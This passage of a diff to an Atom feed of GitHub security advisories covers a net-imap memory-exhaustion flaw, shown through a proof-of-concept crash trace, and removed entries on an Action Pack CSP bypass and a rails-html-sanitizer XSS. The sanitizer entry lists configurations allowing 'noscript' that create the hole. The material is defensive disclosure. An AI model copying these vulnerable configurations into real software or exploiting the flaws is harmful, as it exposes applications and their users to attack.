+/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'
+        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
+        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'
+        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
+        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'
+        from /workspace/poc.rb:70:in '&lt;main&gt;'
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>
+<li><a href="https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>
+<li><a href="https://github.com/advisories/GHSA-7fc5-f82f-cx69">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7fc5-f82f-cx69</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-02-10T17:42:43.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[actionpack] Action Pack contains database-query restrictions bypass]]></title>
         <id>https://github.com/advisories/GHSA-hgpp-pp89-4fgf</id>
@@ -510,155 +1110,5 @@
         </author>
         <category label="severity" term="LOW"/>
         <published>2024-12-10T22:42:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[actionpack] Possible Content Security Policy bypass in Action Dispatch]]></title>
-        <id>https://github.com/advisories/GHSA-vfm5-rmrh-j26v</id>
-        <link href="https://github.com/advisories/GHSA-vfm5-rmrh-j26v"/>
-        <updated>2024-12-11T21:18:30.000Z</updated>
-        <content type="html"><![CDATA[<p>There is a possible Cross Site Scripting (XSS) vulnerability  in the <code>content_security_policy</code> helper in Action Pack.</p>
-<h2 id="impact">Impact</h2>
-<p>Applications which set Content-Security-Policy (CSP) headers dynamically from untrusted user input may be vulnerable to carefully crafted inputs being able to inject new directives into the CSP. This could lead to a bypass of the CSP and its protection against XSS and other attacks.</p>
-<h2 id="releases">Releases</h2>
-<p>The fixed releases are available at the normal locations.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Applications can avoid setting CSP headers dynamically from untrusted input, or can validate/sanitize that input.</p>
-<h2 id="credits">Credits</h2>
-<p>Thanks to <a href="https://hackerone.com/ryotak">ryotak</a> for the report!</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rails/rails/security/advisories/GHSA-vfm5-rmrh-j26v">https://github.com/rails/rails/security/advisories/GHSA-vfm5-rmrh-j26v</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-54133">https://nvd.nist.gov/vuln/detail/CVE-2024-54133</a></li>
-<li><a href="https://github.com/rails/rails/commit/2e3f41e4538b9ca1044357f6644f037bbb7c6c49">https://github.com/rails/rails/commit/2e3f41e4538b9ca1044357f6644f037bbb7c6c49</a></li>
-<li><a href="https://github.com/rails/rails/commit/3da2479cfe1e00177114b17e496213c40d286b3a">https://github.com/rails/rails/commit/3da2479cfe1e00177114b17e496213c40d286b3a</a></li>
-<li><a href="https://github.com/rails/rails/commit/5558e72f22fc69c1c407b31ac5fb3b4ce087b542">https://github.com/rails/rails/commit/5558e72f22fc69c1c407b31ac5fb3b4ce087b542</a></li>
-<li><a href="https://github.com/rails/rails/commit/cb16a3bb515b5d769f73926d9757270ace691f1d">https://github.com/rails/rails/commit/cb16a3bb515b5d769f73926d9757270ace691f1d</a></li>
-<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-54133.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-54133.yml</a></li>
-<li><a href="https://github.com/advisories/GHSA-vfm5-rmrh-j26v">https://github.com/advisories/GHSA-vfm5-rmrh-j26v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vfm5-rmrh-j26v</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-12-10T22:42:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[actionpack] Possible Content Security Policy bypass in Action Dispatch]]></title>
-        <id>https://github.com/advisories/GHSA-vfm5-rmrh-j26v</id>
-        <link href="https://github.com/advisories/GHSA-vfm5-rmrh-j26v"/>
-        <updated>2024-12-11T21:18:30.000Z</updated>
-        <content type="html"><![CDATA[<p>There is a possible Cross Site Scripting (XSS) vulnerability  in the <code>content_security_policy</code> helper in Action Pack.</p>
-<h2 id="impact">Impact</h2>
-<p>Applications which set Content-Security-Policy (CSP) headers dynamically from untrusted user input may be vulnerable to carefully crafted inputs being able to inject new directives into the CSP. This could lead to a bypass of the CSP and its protection against XSS and other attacks.</p>
-<h2 id="releases">Releases</h2>
-<p>The fixed releases are available at the normal locations.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Applications can avoid setting CSP headers dynamically from untrusted input, or can validate/sanitize that input.</p>
-<h2 id="credits">Credits</h2>
-<p>Thanks to <a href="https://hackerone.com/ryotak">ryotak</a> for the report!</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rails/rails/security/advisories/GHSA-vfm5-rmrh-j26v">https://github.com/rails/rails/security/advisories/GHSA-vfm5-rmrh-j26v</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-54133">https://nvd.nist.gov/vuln/detail/CVE-2024-54133</a></li>
-<li><a href="https://github.com/rails/rails/commit/2e3f41e4538b9ca1044357f6644f037bbb7c6c49">https://github.com/rails/rails/commit/2e3f41e4538b9ca1044357f6644f037bbb7c6c49</a></li>
-<li><a href="https://github.com/rails/rails/commit/3da2479cfe1e00177114b17e496213c40d286b3a">https://github.com/rails/rails/commit/3da2479cfe1e00177114b17e496213c40d286b3a</a></li>
-<li><a href="https://github.com/rails/rails/commit/5558e72f22fc69c1c407b31ac5fb3b4ce087b542">https://github.com/rails/rails/commit/5558e72f22fc69c1c407b31ac5fb3b4ce087b542</a></li>
-<li><a href="https://github.com/rails/rails/commit/cb16a3bb515b5d769f73926d9757270ace691f1d">https://github.com/rails/rails/commit/cb16a3bb515b5d769f73926d9757270ace691f1d</a></li>
-<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-54133.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-54133.yml</a></li>
-<li><a href="https://github.com/advisories/GHSA-vfm5-rmrh-j26v">https://github.com/advisories/GHSA-vfm5-rmrh-j26v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vfm5-rmrh-j26v</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-12-10T22:42:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rails-html-sanitizer] rails-html-sanitizer has XSS vulnerability with certain configurations]]></title>
-        <id>https://github.com/advisories/GHSA-rxv5-gxqc-xx8g</id>
-        <link href="https://github.com/advisories/GHSA-rxv5-gxqc-xx8g"/>
-        <updated>2024-12-03T18:50:36.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>There is a possible XSS vulnerability with certain configurations of Rails::HTML::Sanitizer 1.6.0 when used with Rails &gt;= 7.1.0.</p>
-<ul>
-<li>Versions affected: 1.6.0</li>
-<li>Not affected: &lt; 1.6.0</li>
-<li>Fixed versions: 1.6.1</li>
-</ul>
-<h2 id="impact">Impact</h2>
-<p>A possible XSS vulnerability with certain configurations of Rails::HTML::Sanitizer may allow an attacker to inject content if HTML5 sanitization is enabled and the application developer has overridden the sanitizer's allowed tags in the following way:</p>
-<ul>
-<li>the "noscript" element is explicitly allowed</li>
-</ul>
-<p>Code is only impacted if Rails is configured to use HTML5 sanitization, please see documentation for <a href="https://guides.rubyonrails.org/configuring.html#config-action-view-sanitizer-vendor"><code>config.action_view.sanitizer_vendor</code></a> and <a href="https://guides.rubyonrails.org/configuring.html#config-action-text-sanitizer-vendor"><code>config.action_text.sanitizer_vendor</code></a> for more information on these configuration options.</p>
-<p>The default configuration is to disallow all of these elements. Code is only impacted if allowed tags are being overridden. Applications may be doing this in a few different ways:</p>
-<ol>
-<li>using application configuration to configure Action View sanitizers' allowed tags:</li>
-</ol>
-<pre><code class="language-ruby"># In config/application.rb
-config.action_view.sanitized_allowed_tags = ["noscript"]
-</code></pre>
-<p>  see <a href="https://guides.rubyonrails.org/configuring.html#configuring-action-view">https://guides.rubyonrails.org/configuring.html#configuring-action-view</a></p>
-<ol start="2">
-<li>using a <code>:tags</code> option to the Action View helper <code>sanitize</code>:</li>
-</ol>
-<pre><code>&lt;%= sanitize @comment.body, tags: ["noscript"] %&gt;
-</code></pre>
-<p>  see <a href="https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize">https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize</a></p>
-<ol start="3">
-<li>setting Rails::HTML5::SafeListSanitizer class attribute <code>allowed_tags</code>:</li>
-</ol>
-<pre><code class="language-ruby"># class-level option
-Rails::HTML5::SafeListSanitizer.allowed_tags = ["noscript"]
-</code></pre>
-<p>  (note that this class may also be referenced as <code>Rails::Html::SafeListSanitizer</code>)</p>
-<ol start="4">
-<li>using a <code>:tags</code> options to the Rails::HTML5::SafeListSanitizer instance method <code>sanitize</code>:</li>
-</ol>
-<pre><code class="language-ruby"># instance-level option
-Rails::HTML5::SafeListSanitizer.new.sanitize(@article.body, tags: ["noscript"])
-</code></pre>
-<p>  (note that this class may also be referenced as <code>Rails::Html::SafeListSanitizer</code>)</p>
-<ol start="5">
-<li>setting ActionText::ContentHelper module attribute <code>allowed_tags</code>:</li>
-</ol>
-<pre><code class="language-ruby">ActionText::ContentHelper.allowed_tags = ["noscript"]
-</code></pre>
-<p>All users overriding the allowed tags by any of the above mechanisms to include "noscript" should either upgrade or use one of the workarounds.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Any one of the following actions will work around this issue:</p>
-<ul>
-<li>Remove "noscript" from the overridden allowed tags,</li>
-<li>Or, downgrade sanitization to HTML4 (see documentation for <a href="https://guides.rubyonrails.org/configuring.html#config-action-view-sanitizer-vendor"><code>config.action_view.sanitizer_vendor</code></a> and <a href="https://guides.rubyonrails.org/configuring.html#config-action-text-sanitizer-vendor"><code>config.action_text.sanitizer_vendor</code></a> for more information).</li>
-</ul>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (4.9)</a></li>
-<li>Original report: <a href="https://hackerone.com/reports/2509647">https://hackerone.com/reports/2509647</a></li>
-</ul>
-<h2 id="credit">Credit</h2>
-<p>This vulnerability was responsibly reported by So Sakaguchi (<a href="https://hackerone.com/mokusou">mokusou</a>) and <a href="https://hackerone.com/taise">taise</a>.</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-rxv5-gxqc-xx8g">https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-rxv5-gxqc-xx8g</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53989">https://nvd.nist.gov/vuln/detail/CVE-2024-53989</a></li>
-<li><a href="https://github.com/rails/rails-html-sanitizer/commit/16251735e36ebdc302e2f90f2a39cad56879414f">https://github.com/rails/rails-html-sanitizer/commit/16251735e36ebdc302e2f90f2a39cad56879414f</a></li>
-<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2024-53989.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2024-53989.yml</a></li>
-<li><a href="https://github.com/advisories/GHSA-rxv5-gxqc-xx8g">https://github.com/advisories/GHSA-rxv5-gxqc-xx8g</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rxv5-gxqc-xx8g</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-12-02T22:18:27.000Z</published>
     </entry>
 </feed>
